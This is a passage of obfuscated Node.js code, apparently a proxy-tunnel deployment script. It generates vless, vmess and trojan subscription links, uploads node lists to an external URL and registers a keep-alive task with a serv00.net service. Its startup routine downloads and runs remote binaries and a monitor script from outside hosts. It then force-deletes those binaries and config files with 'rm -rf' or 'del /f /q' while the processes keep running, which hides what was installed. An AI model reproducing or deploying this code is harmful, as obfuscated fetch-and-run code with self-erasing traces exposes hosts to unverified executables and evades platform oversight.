getMetaInfo(),_0x5e2906=NAME?NAME+'-'+_0x1bbe10:_0x1bbe10,_0x4511e3={'v':'2','ps':_0x5e2906,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x1080d2(0xf0),'host':_0x37c36f,'path':'/vmess-arg'+'o?ed=2560','tls':'tls','sni':_0x37c36f,'fp':'firefox'},_0x5c0caa=Buffer[_0x1080d2(0xc3)](JSON[_0x1080d2(0x139)](_0x4511e3))[_0x1080d2(0x129)]('base64'),_0x4c6d37='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+('?encryptio'+'n=none&sec'+'urity=tls&'+'sni=')+_0x37c36f+('&fp=firefo'+'x&type=ws&'+'host=')+_0x37c36f+('&path=%2Fv'+_0x1080d2(0x187)+_0x1080d2(0xb8)+'0#')+_0x5e2906+'\x0a\x0avmess://'+_0x5c0caa+(_0x1080d2(0x101)+'/')+UUID+'@'+CFIP+':'+CFPORT+(_0x1080d2(0x152)+'tls&sni=')+_0x37c36f+(_0x1080d2(0x182)+_0x1080d2(0x177)+'host=')+_0x37c36f+('&path=%2Ft'+_0x1080d2(0x14e)+'%3Fed%3D25'+_0x1080d2(0x124))+_0x5e2906+'\x0a\x20\x20\x20\x20';return console['log']('订阅内容Base64'+':'),console[_0x1080d2(0xae)](Buffer[_0x1080d2(0xc3)](_0x4c6d37)['toString']('base64')),subscriptionContent=_0x4c6d37,fs[_0x1080d2(0xbd)+_0x1080d2(0xcc)](subPath,Buffer['from'](_0x4c6d37)['toString'](_0x1080d2(0x163))),console['log'](subPath+'\x20保存成功'),uploadNodes(),_0x4c6d37;}}async function uploadNodes(){const _0x37d913=_0x3b59bf;if(UPLOAD_URL&&PROJECT_URL){const _0x56b7ed=PROJECT_URL+'/'+SUB_PATH,_0x1ddd6b={'subscription':[_0x56b7ed]};try{const _0x48755a=await axios['post'](UPLOAD_URL+(_0x37d913(0x11f)+'ubscriptio'+'ns'),_0x1ddd6b,{'headers':{'Content-Type':'applicatio'+_0x37d913(0xf6)}});return _0x48755a&&_0x48755a[_0x37d913(0x199)]===0xc8?(console[_0x37d913(0xae)]('订阅上传成功'),_0x48755a):null;}catch(_0x3c1ed9){if(_0x3c1ed9['response']){if(_0x3c1ed9[_0x37d913(0xa9)][_0x37d913(0x199)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x37d913(0xb4)](listPath))return;const _0x31a82d=fs[_0x37d913(0x10b)+'nc'](listPath,'utf-8'),_0x4f91f4=_0x31a82d[_0x37d913(0x133)]('\x0a')[_0x37d913(0xb0)](_0x49f925=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x37d913(0xab)](_0x49f925));if(_0x4f91f4['length']===0x0)return;const _0x6131e9=JSON[_0x37d913(0x139)]({'nodes':_0x4f91f4});try{const _0x5d2bbf=await axios[_0x37d913(0x158)](UPLOAD_URL+('/api/add-n'+'odes'),_0x6131e9,{'headers':{'Content-Type':'applicatio'+_0x37d913(0xf6)}});return _0x5d2bbf&&_0x5d2bbf[_0x37d913(0x199)]===0xc8?(console['log'](_0x37d913(0x142)),_0x5d2bbf):null;}catch(_0x19ea0f){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xc3146e=_0x5607,_0x23099b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x23099b[_0xc3146e(0xdb)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x23099b['push'](phpPath);console[_0xc3146e(0xae)](_0xc3146e(0x126)+'控脚本...');const _0x1f095d=_0x23099b['filter'](_0x5875bd=>fs[_0xc3146e(0xb4)](_0x5875bd));_0x1f095d['length']>0x0?process['platform']===_0xc3146e(0xec)?exec('del\x20/f\x20/q\x20'+_0x1f095d['join']('\x20')+(_0xc3146e(0x144)+'1'),_0x18494c=>{const _0x85ae8e=_0xc3146e;console[_0x85ae8e(0x107)](),console['log'](_0x85ae8e(0xe5)),console[_0x85ae8e(0xae)]('监控脚本继续运行中.'+'..'),console['log'](_0x85ae8e(0xc0)+'吧！');}):exec(_0xc3146e(0x160)+_0x1f095d['join']('\x20')+(_0xc3146e(0x130)+'l\x202>&1'),_0x287333=>{const _0x4929aa=_0xc3146e;console[_0x4929aa(0x107)](),console['log'](_0x4929aa(0xe5)),console['log']('监控脚本继续运行中.'+'..'),console[_0x4929aa(0xae)]('感谢使用此脚本，享受'+'吧！');}):(console['log'](_0xc3146e(0xe5)),console['log']('监控脚本继续运行中.'+'..'),console[_0xc3146e(0xae)](_0xc3146e(0xc0)+'吧！'));},0x15f90);}async function AddVisitTask(){const _0x5b87df=_0x3b59bf;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x5b87df(0x121));return;}try{const _0x42a1e6=await axios['post'](_0x5b87df(0x15d)+'oo.serv00.'+'net/add-ur'+'l',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5b87df(0x14f)+_0x5b87df(0xf6)}});return console[_0x5b87df(0xae)]('自动访问任务添加成功'),_0x42a1e6;}catch(_0x314c53){return console[_0x5b87df(0x11d)]('添加自动访问任务失败'+':\x20'+_0x314c53['message']),null;}}async function startserver(){const _0x4587ab=_0x3b59bf;try{console['log'](_0x4587ab(0x11a)+'.'),deleteNodes(),cleanupOldFiles(),argoType(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await downloadAndRunMonitorScript(),startMonitorHealthCheck(),await AddVisitTask(),cleanFiles(),console[_0x4587ab(0xae)]('服务器初始化完成');}catch(_0x4dfe90){console['error']('startserve'+_0x4587ab(0x118),_0x4dfe90);}}function _0x40f6(){const _0x5a2f75=['d64.ssss.n','https://am','https://ar','finish','blackhole','te\x20--repor','trojan','floor','监控服务器:\x20','设置监控脚本执行权限','ArgoDomain','r错误:','尝试直接运行监控命令','开始服务器初始化..','2402050MxoPai','utf-8','error','rue\x0a\x20\x20-\x20se','/api/add-s','send','跳过添加自动访问任务','1581539EMyyBL','a88b11cbdd','60#','p\x20|\x20grep\x20\x22','清理临时文件，保留监','ml配置...','SIGINT','toString','监控脚本将继续运行.','找不到适合当前架构的','\x20findstr\x20','\x20成功','48033195da','--no-autou','\x20>/dev/nul','f-vps-moni','\x20--logleve','split','xtls-rprx-','\x22\x20>\x20/dev/n','aarch64','arm64','MONITOR_SE','stringify','join','gxzg.indev',',\x22TunnelID','NEZHA_PORT','用快速隧道','org','l\x20info\x20--u','EXTERNAL_P','节点上传成功','8443','\x20>\x20nul\x202>&','执行命令错误:\x20','监控脚本正在运行','t获取ArgoDom','3001',';\x20charset=','下载\x20','...','\x0a\x20\x20\x20\x20servi','+x\x20','rojan-argo','applicatio','s.in','625895bKMVmo','?security=','path','705529210c','ps\x20aux\x20|\x20g','l\x202>&1\x20&','npm运行错误:\x20','post','收到终止信号，正在清','dge-ip-ver','upgrade','Xray配置文件生成','https://oo','下载或运行监控脚本失','sub.txt','rm\x20-rf\x20','2083','constructo','base64','tcp','eu.org','alhost:','tunnel:\x20','web运行错误:\x20','search','18WqenKG','PROJECT_UR','basename','/trojan','隧道YAML配置生成','https+loca','has','/trojan-ar','监控环境变量不完整，','/dev/null','\x22\x20>/dev/nu','\x0aprotocol:','MONITOR_KE','x&type=ws&','exit','RVER','tor/main/c','d-0287-41d','ess','http://loc','isFile','/vless-arg','隧道启动失败','count:\x20tru','&fp=firefo','direct','\x0a\x20\x20\x20\x20origi','countryCod','createWrit','less-argo%','catch','rvice:\x20htt','uvwxyz','13167UlYkiu','读取boot.log','UseIP','2087','yc.mn/bot','\x20&&\x20','ARGO_DOMAI','MONITOR_UR','includes',':\x20false\x0auu','Hello\x20worl','lse\x0ainsecu','rt_delay:\x20','UTH\x20变量为空，使','status','tunnel\x20--e','2096','60PesOvJ','-monitor.s','g.de5.net','id:\x20','/vmess-arg','block','监控健康检查已启动','response','child_proc','test','8/dns-quer','le\x20','log','\x20失败:\x20','filter','\x20-u\x20','ls-file:\x20','e:\x20true\x0adi','existsSync','/null\x202>&1','false','1830IkQWeQ','3Fed%3D256','ARGO_AUTH\x20','otocol\x20htt','cret:\x20','m64.ssss.n','writeFileS','vless','\x0ause_gitee','感谢使用此脚本，享受','message','3166512wJSLdd','from','跳过监控脚本启动','ain，重新运行bo','t-delay\x204\x20','apply','se\x0agpu:\x20fa','nohup\x20','taskkill\x20/','24553430FHtdmN','ync','cret格式，使用t','16f9','boot.log','ain/cf-vps','PORT','url','text/plain','ull\x202>&1\x20&','-monitor/m','\x20-s\x20','arm','klmnopqrst','https://ip','substring','push','TunnelSecr','pdate\x20--pr','http://ip-','\x20运行中','等待tunnel.y','env','N\x20或\x20ARGO_A','e58d6d96cd','4\x0aserver:\x20','应用正在运行','yc.mn/web','platform','\x20已创建','NAME','stream','(((.+)+)+)','win32','ag\x22:\x225df51','https://ra','on/','none','startsWith','com/kadida','time-vps.b','set','charAt','n/json','localhost:','\x20--disable','2053','config.yam','127.0.0.1','country_co','hubusercon','alhost:300','data','wget\x20https','\x0a\x0atrojan:/','FILE_PATH','rt_period:','vision','abcdefghij','replace','clear','理...','length','ef8a13b1d5','readFileSy','3104166pIpThr'];_0x40f6=function(){return _0x5a2f75;};return _0x40f6();}app['listen'](PORT,()=>console[_0x3b59bf(0xae)]('HTTP服务运行在内'+'部端口:\x20'+PORT)),startserver()[_0x3b59bf(0x188)](_0x872d8f=>{console['error']('未处理的starts'+'erver错误:',_0x872d8f);}),process['on'](_0x3b59bf(0x128),()=>{const _0x22445e=_0x3b59bf;console['log']('收到关闭信号，正在清'+_0x22445e(0x108)),console['log'](_0x22445e(0x12a)+'..'),console[_0x22445e(0xae)]('程序退出'),process[_0x22445e(0x178)](0x0);}),process['on']('SIGTERM',()=>{const _0xc10aef=_0x3b59bf;console[_0xc10aef(0xae)](_0xc10aef(0x159)+'理...'),console['log']('监控脚本将继续运行.'+'..'),console[_0xc10aef(0xae)]('程序退出'),process[_0xc10aef(0x178)](0x0);});
